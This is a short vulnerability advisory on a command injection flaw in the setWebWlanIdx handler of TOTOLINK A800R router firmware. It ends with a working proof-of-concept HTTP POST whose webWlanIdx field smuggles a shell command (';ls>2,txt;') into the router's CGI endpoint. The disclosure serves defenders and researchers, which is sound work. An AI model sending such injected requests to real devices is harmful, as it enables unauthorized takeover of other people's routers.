# TOTOLINK A800R setWebWlanIdx
### Overview
vendor: TOTOLINK
product: A800R
version: V4.1.2cu.5137_B20200730
type: Command Injection
### Vulnerability Description
A vulnerability has been found in TOTOLINK A800R V4.1.2cu.5137_B20200730. There is a command injection vulnerability in the wireless.so. The manipulation of the argument webWlanIdx leads to command injection. The attack is possible to be carried out remotely. The exploit has been disclosed to the public and may be used.
### Vulnerability Details
The `setWebWlanIdx` function retrieves the `webWlanIdx` parameter from the user request. The parameter is passed to the CsteSystem function without any check, which may cause command injection.

![](./images/14.png)

### POC
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 67
Origin: http://192.168.0.1
Connection: keep-alive
Referer: http://192.168.0.1/mobile/home.asp?timestamp=1604138297
Cookie: SESSION_ID=2:1604138246:2

{
	"topicurl":"setting/setWebWlanIdx",
	"webWlanIdx":";ls>2,txt;"
}
```
